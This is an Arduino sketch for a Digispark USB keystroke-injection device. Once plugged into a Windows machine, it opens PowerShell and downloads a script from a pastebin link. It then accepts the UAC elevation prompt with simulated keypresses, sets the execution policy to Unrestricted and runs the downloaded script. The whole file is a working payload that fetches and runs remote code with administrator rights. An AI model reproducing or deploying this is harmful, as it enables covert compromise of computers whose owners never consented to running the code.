#include "DigiKeyboard.h"
#define KEY_LEFT 0x50
// CHANGE THE LINK BELOW BEFORE USING
#define link "https://pastebin.com/raw/gFKxnfVD" // Add a link
void setup() {
  pinMode(1, OUTPUT); // LED Setup
}
void loop() {
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); // Turn on LED to signify task started
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("$path = \"$env:USERPROFILE\\script2.ps1\"");
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
  DigiKeyboard.delay(500);
  // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
  DigiKeyboard.println("$client.DownloadFile(\""link"\", $path)");
  DigiKeyboard.delay(4000);

  DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.delay(750);

  DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
  DigiKeyboard.delay(4000);
  for (int i = 0; i < 2; i++)
  {
    DigiKeyboard.delay(300);
    DigiKeyboard.println("exit");
  }

  digitalWrite(1, LOW);
  for(;;){}
}
